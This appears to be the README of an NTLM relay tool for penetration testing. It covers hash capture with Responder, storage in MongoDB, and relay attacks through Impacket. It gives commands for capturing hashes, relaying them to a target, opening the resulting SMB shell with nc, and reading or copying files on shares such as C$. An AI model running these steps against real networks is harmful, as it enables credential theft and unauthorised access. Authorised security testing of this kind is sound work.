# ntlm-relay-tool/README.md

# NTLM Relay Tool

## Overview

The NTLM Relay Tool is a modular application designed to capture NTLM hashes, store them securely, and exploit them through NTLM relay attacks and password cracking. This tool is intended for security professionals and researchers to analyze NTLM authentication vulnerabilities.

## Features

- **Capture Module**: Captures NTLM authentication requests using the Responder tool.
- **Storage Module**: Manages the storage of captured hashes and related data in a database.
- **Exploit Module**: Facilitates NTLM relay attacks and password cracking using captured hashes.

## Dependencies

The NTLM Relay Tool requires the following dependencies:

- Python 3.6 or higher
- MongoDB (for hash storage)
- Impacket library (for reliable NTLM relay attacks)

### Installing Dependencies

Install required Python packages:
```bash
pip install -r requirements.txt
```

Install Impacket (required for relay functionality):
```bash
pip install impacket
# or on Kali Linux:
apt update && apt install -y python3-impacket
```

## Usage

### NTLM Capture

To capture NTLM authentication attempts:
```bash
python src/main.py capture --interface eth0
```

### NTLM Relay Attack

To perform an NTLM relay attack:
```bash
python src/main.py relay --target <target_ip>
```

The relay mode leverages impacket-ntlmrelayx for reliable SMB protocol handling. After a successful relay, an interactive SMB shell will be available at localhost:11000. Connect to it using:
```bash
nc 127.0.0.1 11000
```

#### Common SMB Shell Commands

Once connected to the SMB shell, you can use these commands:
```
help       - Show available commands
shares     - List available shares on the target
use <share>- Connect to a specific share (e.g., "use C$")
ls         - List files in current directory
cd <dir>   - Change directory
get <file> - Download a file
put <file> - Upload a file
cat <file> - Display contents of a file
```

#### Ending a Relay Session

To stop the relay:
1. Press Ctrl+C in the terminal running the relay tool
2. Close any active SMB shell sessions with `exit` command

## Testing

To run the unit tests, use:
```bash
pytest tests/
```

## Contributing

Contributions are welcome! Please submit a pull request or open an issue for any enhancements or bug fixes.

## License

This project is licensed under the MIT License. See the LICENSE file for details.